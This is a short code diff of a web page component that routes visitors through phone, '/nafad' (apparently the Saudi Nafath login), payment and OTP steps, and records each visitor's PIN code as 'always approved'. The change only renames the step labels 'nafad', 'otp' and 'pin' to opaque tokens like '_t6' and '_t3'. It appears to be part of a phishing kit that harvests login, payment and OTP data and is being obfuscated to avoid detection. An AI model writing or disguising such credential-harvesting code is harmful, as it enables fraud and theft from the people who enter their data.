@@ -50,11 +50,11 @@ export default function ConfiPage() {
             router.push("/main")
           } else if (step === "phone") {
             router.push("/phone-info")
-          } else if (step === "nafad") {
+          } else if (step === "_t6") {
             router.push("/nafad")
           } else if (step === "payment") {
             router.push("/check")
-          } else if (step === "otp") {
+          } else if (step === "_t2") {
             router.push("/veri")
           }
         }
@@ -148,7 +148,7 @@ export default function ConfiPage() {
       })
 
       // Add PIN to history (always approved)
-      await addToHistory(visitorID, "pin", {
+      await addToHistory(visitorID, "_t3", {
         pinCode
       }, "approved")
 
